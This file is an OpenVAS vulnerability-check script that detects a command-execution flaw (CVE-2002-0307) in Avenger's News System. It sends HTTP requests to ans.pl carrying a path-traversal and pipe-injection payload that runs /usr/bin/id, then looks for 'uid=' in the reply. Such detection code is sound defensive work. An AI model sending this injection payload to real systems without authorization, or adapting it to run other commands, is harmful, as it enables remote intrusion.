# OpenVAS Vulnerability Test
# $Id: avengers_news_system_command_execution.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Avenger's News System Command Execution
#
# Authors:
# SecurITeam
#
# Copyright:
# Copyright (C) 2002 SecurITeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "A security vulnerability in Avenger's News System (ANS) allows
command execution by remote attackers who have access to the ANS 
page.";

tag_solution = "see http://www.securiteam.com/unixfocus/5MP090A6KG.html";

if(description)
{
 script_id(10875);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(4147);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_cve_id("CVE-2002-0307");
 
 name = "Avenger's News System Command Execution";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Avenger's News System Command Execution";
 
 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright("This script is Copyright (C) 2002 SecurITeam");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("find_service.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

function check(req)
{
  req = http_get(item:req, port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if( buf == NULL ) exit(0);

  if (("uid=" >< buf) && ("groups=" >< buf))
  {
   	security_hole(port:port);
	return(1);
  }
 return(0);
}

port = get_http_port(default:80);




cginameandpath[0] = string("/ans.pl?p=../../../../../usr/bin/id|&blah");
cginameandpath[1] = string("/ans/ans.pl?p=../../../../../usr/bin/id|&blah");
cginameandpath[2] = "";

i = 0;
if(get_port_state(port))
{
 for (i = 0; cginameandpath[i]; i = i + 1)
 { 
  url = cginameandpath[i];
  if(check(req:url))exit(0);
 }
}

foreach dir (cgi_dirs())
{
cginameandpath[0] = string(dir, "/ans.pl?p=../../../../../usr/bin/id|&blah");
cginameandpath[1] = string(dir, "/ans/ans.pl?p=../../../../../usr/bin/id|&blah");

i = 0;
if(get_port_state(port))
{
 for (i = 0; cginameandpath[i]; i = i + 1)
 { 
  url = cginameandpath[i];
  if(check(req:url))exit(0);
 }
}
}
